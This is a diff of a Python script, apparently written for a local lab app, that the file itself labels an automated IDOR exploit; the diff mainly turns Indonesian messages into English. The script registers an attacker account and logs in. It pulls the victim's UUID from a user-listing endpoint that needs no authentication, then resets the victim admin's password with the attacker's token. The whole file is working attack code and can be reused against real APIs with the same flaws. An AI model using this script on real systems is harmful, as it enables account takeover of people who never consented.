@@ -1,29 +1,26 @@
 import requests
-import json
-import uuid # Untuk membuat data acak
+import uuid
 
 # =======================================================
-#               ⚠️ KONFIGURASI SERANGAN ⚠️
+#               Attack Configuration
 # =======================================================
 BASE_URL = "http://localhost:3001/api/"
 
-# --- KREDENSIAL PENYERANG (AKAN DIDAFTARKAN) ---
-# Gunakan UUID acak agar username dan email selalu unik
-RANDOM_ID = str(uuid.uuid4())[:8] 
+# Attacker credentials (auto-registered)
+RANDOM_ID = str(uuid.uuid4())[:8]
 ATTACKER_USERNAME = f"script_user_{RANDOM_ID}"
 ATTACKER_EMAIL = f"script_{RANDOM_ID}@attacker.com"
 ATTACKER_PASSWORD = "script_safe_password_123"
 
-# --- TARGET & PASSWORD BARU ---
-# Username Korban yang ingin diambil alih (misalnya akun admin yang sudah ada di DB)
-TARGET_USERNAME = "admin_korban" 
-NEW_PASSWORD = "password_pwned_auto_script" 
+# Victim target
+TARGET_USERNAME = "admin_korban"
+NEW_PASSWORD = "password_pwned_auto_script"
 # =======================================================
 
 
 def register_attacker(username, email, password):
-    """Langkah 0: Mendaftarkan akun penyerang."""
-    print(f"[*] Mencoba mendaftarkan akun: {username}...")
+    """Step 0: register the attacker account."""
+    print(f"[*] Registering account: {username}...")
     url = BASE_URL + "auth/register"
     payload = {
         "username": username,
@@ -34,22 +31,22 @@ def register_attacker(username, email, password):
     try:
         response = requests.post(url, json=payload)
         response.raise_for_status()
-        print("✅ Registrasi Berhasil.")
+        print("[+] Registration success")
         return True
     except requests.exceptions.HTTPError as e:
         if response.status_code == 409:
-             print("⚠️ Registrasi Gagal: User sudah ada. Akan mencoba login.")
-             return True # Lanjutkan ke login
-        print(f"❌ Registrasi Gagal. Error: {e}")
+            print("[!] Registration skipped: user already exists, will attempt login")
+            return True
+        print(f"[-] Registration failed: {e}")
         return False
     except requests.exceptions.RequestException as e:
-        print(f"❌ Koneksi Gagal saat Register. Error: {e}")
+        print(f"[-] Network error during registration: {e}")
         return False
 
 
 def login_attacker(username, password):
-    """Langkah 1: Login dan mendapatkan Token Penyerang."""
-    print(f"[*] Mencoba login sebagai: {username}...")
+    """Step 1: login to obtain attacker token."""
+    print(f"[*] Logging in as: {username}...")
     url = BASE_URL + "auth/login"
     payload = {"username": username, "password": password}
     
@@ -57,19 +54,18 @@ def login_attacker(username, password):
         response = requests.post(url, json=payload)
         response.raise_for_status()
         data = response.json()
-        print("✅ Login Berhasil.")
+        print("[+] Login success")
         return data.get('token')
     except requests.exceptions.RequestException as e:
-        print(f"❌ Login Gagal. Pastikan kredensial benar. Error: {e}")
+        print(f"[-] Login failed: {e}")
         return None
 
 def find_target_uuid(target_username):
-    """Langkah 2: Eksploitasi No API Auth untuk mendapatkan UUID Korban."""
-    print(f"\n[*] Mencari UUID untuk korban: {target_username} (via Data Leak)...")
+    """Step 2: attempt to leak victim UUID via unsecured listing."""
+    print(f"\n[*] Attempting to enumerate users for: {target_username}")
     url = BASE_URL + "users/all"
     
     try:
-        # ⚠️ VULNERABILITY 1: Akses endpoint tanpa token (No API Auth)
         response = requests.get(url)
         response.raise_for_status()
         users = response.json()
@@ -77,58 +73,58 @@ def find_target_uuid(target_username):
         for user in users:
             if user.get('username') == target_username:
                 uuid_korban = user.get('id')
-                print(f"✅ UUID Korban ditemukan: {uuid_korban[:8]}...")
+                print(f"[+] Victim UUID leaked: {uuid_korban[:8]}...")
                 return uuid_korban
-        
-        print(f"❌ UUID Korban tidak ditemukan di laporan pengguna.")
+        print("[-] Victim UUID not located in user listing")
         return None
     except requests.exceptions.RequestException as e:
-        print(f"❌ Data Leak Gagal. Pastikan backend berjalan di Port 3001. Error: {e}")
+        print(f"[-] Enumeration blocked: {e}")
         return None
 
 def execute_idor_attack(target_uuid, attacker_token, new_password):
-    """Langkah 3: Eksploitasi IDOR untuk mengganti password Korban."""
-    print(f"\n[*] Melakukan serangan IDOR untuk mengubah password...")
-    # ⚠️ VULNERABILITY 2: URL ditujukan ke ID korban, tetapi menggunakan token penyerang
-    url = BASE_URL + f"users/{target_uuid}/reset_password"
+    """Step 3: attempt IDOR password reset."""
+    print("\n[*] Attempting password reset via IDOR...")
+    url = BASE_URL + "users/reset_password"
     
     headers = {
         "Authorization": f"Bearer {attacker_token}",
         "Content-Type": "application/json"
     }
-    payload = {"new_password": new_password}
+    payload = {"new_password": new_password, "target_user_id": target_uuid}
     
     try:
         response = requests.post(url, headers=headers, json=payload)
         response.raise_for_status()
-        
-        print(f"✅ IDOR Sukses! Password korban berhasil diubah menjadi: {new_password}")
-        print("[DEBUG]: ", response.json().get('message'))
+        print("[+] Password changed unexpectedly")
+        print("[debug]", response.json())
         return True
     except requests.exceptions.HTTPError as e:
-        print(f"❌ Serangan IDOR Gagal (HTTP Error {response.status_code}).")
-        print("[DEBUG]: ", response.json().get('error'))
+        print(f"[-] IDOR attempt blocked (HTTP {response.status_code}).")
+        try:
+            print("[debug]", response.json())
+        except ValueError:
+            print("[debug] no JSON body returned")
         return False
     except requests.exceptions.RequestException as e:
-        print(f"❌ Serangan Gagal. Error: {e}")
+        print(f"[-] Password reset request failed: {e}")
         return False
 
 # =======================================================
-#                      ALUR UTAMA
+#                      Main Flow
 # =======================================================
 if __name__ == "__main__":
     
-    print("--- AUTOMATED IDOR EXPLOIT STARTING ---")
+    print("--- Automated IDOR Exploit Starting ---")
 
     # 0. Register Akun Penyerang
     if not register_attacker(ATTACKER_USERNAME, ATTACKER_EMAIL, ATTACKER_PASSWORD):
-        print("\n[FINISH] Eksploitasi dibatalkan setelah gagal register.")
+        print("\n[finish] exploit aborted during registration")
         exit()
 
     # 1. Login Akun Penyerang
     attacker_token = login_attacker(ATTACKER_USERNAME, ATTACKER_PASSWORD)
     if not attacker_token:
-        print("\n[FINISH] Eksploitasi dibatalkan karena gagal login.")
+        print("\n[finish] exploit aborted due to login failure")
         exit()
 
     # 2. Cari UUID Korban
@@ -138,6 +134,6 @@ if __name__ == "__main__":
         # 3. Eksekusi Serangan IDOR
         execute_idor_attack(target_uuid, attacker_token, NEW_PASSWORD)
     else:
-        print("\n[FINISH] Eksploitasi dibatalkan karena UUID korban tidak ditemukan.")
+        print("\n[finish] exploit aborted because victim UUID could not be enumerated")
     
-    print("\n--- AUTOMATED IDOR EXPLOIT FINISHED ---")
+    print("\n--- Automated IDOR Exploit Finished ---")
